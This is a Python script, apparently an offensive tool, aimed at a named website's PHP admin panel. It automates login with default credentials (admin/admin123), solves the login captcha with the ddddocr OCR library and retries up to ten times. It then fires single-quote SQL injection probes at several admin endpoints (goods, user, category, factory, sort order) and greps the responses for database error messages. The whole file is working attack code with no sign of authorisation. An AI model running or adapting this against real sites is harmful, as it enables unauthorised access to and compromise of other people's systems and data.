#!/usr/bin/env python3
"""gz: authenticated SQLi probe on admin endpoints"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# admin SQLi probes
tests = [
    ("/index.php?m=admin&c=goods&a=index&keyword=1%27", "goods-kw"),
    ("/index.php?m=admin&c=goods&a=index&id=1%27", "goods-id"),
    ("/index.php?m=admin&c=user&a=user&keyword=1%27", "user-kw"),
    ("/index.php?m=admin&c=category&a=index&id=1%27", "cat-id"),
    ("/index.php?m=admin&c=factory&a=index&id=1%27", "factory-id"),
    ("/index.php?m=admin&c=goods&a=index&sort_order=1%27", "goods-sort"),
]
for u, tag in tests:
    code, final, body = fetch(HOST + u, headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
    b = body.decode("utf-8", "ignore")
    # look for SQL error signatures
    sql_errs = re.findall(r'(SQLSTATE|mysql|syntax error|You have an error|SQL syntax|Warning.*sql|Fatal.*sql)', b, re.I)
    size_diff = len(b)
    print("%s [%s]: %s size=%d sqlerr=%d" % (tag, u[:55], code, size_diff, len(sql_errs)))
    if sql_errs:
        print("  ERR:", sql_errs[:2])
        i = b.lower().find(sql_errs[0].lower())
        print("  ctx:", b[max(0,i-100):i+200].replace("\n", " ")[:280])
